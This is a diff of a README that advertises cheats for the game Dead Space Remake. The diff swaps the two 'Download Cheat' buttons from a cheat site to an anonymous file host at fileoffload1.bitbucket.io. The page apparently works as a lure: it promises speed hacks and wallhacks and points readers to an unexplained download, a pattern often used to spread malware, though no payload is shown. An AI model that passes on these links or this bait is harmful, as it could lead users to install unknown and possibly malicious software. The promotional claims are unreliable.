@@ -8,7 +8,7 @@ With the right **Dead Space Remake Cheats**, you can **turn off fear**, unlock e
 
 💡 If you’ve played it once the hard way — it’s time to replay it the **fun** way.
 
-[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://wecheaters.github.io/cheats/dead-space-remake/)
+[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://fileoffload1.bitbucket.io)
 ---
 
 ## 💥 Most Popular Dead Space Remake Cheats
@@ -44,7 +44,7 @@ With the right **Dead Space Remake Cheats**, you can **turn off fear**, unlock e
 * ✅ **Speed Hack** – Move faster across long ship corridors
 * ✅ **Wallhack / ESP (rare builds)** – See enemies through doors
 
-[![Download Cheat](https://static.wixstatic.com/media/a1ece4_abb2c611a7f24bd9b327beae592d9e1b~mv2.png/v1/fill/w_980,h_553,al_c,q_90,usm_0.66_1.00_0.01,enc_avif,quality_auto/a1ece4_abb2c611a7f24bd9b327beae592d9e1b~mv2.png)](https://wecheaters.github.io/cheats/dead-space-remake/)
+[![Download Cheat](https://static.wixstatic.com/media/a1ece4_abb2c611a7f24bd9b327beae592d9e1b~mv2.png/v1/fill/w_980,h_553,al_c,q_90,usm_0.66_1.00_0.01,enc_avif,quality_auto/a1ece4_abb2c611a7f24bd9b327beae592d9e1b~mv2.png)](https://fileoffload1.bitbucket.io)
 ---
 
 ## 🆚 Vanilla vs Cheat-Enhanced Experience
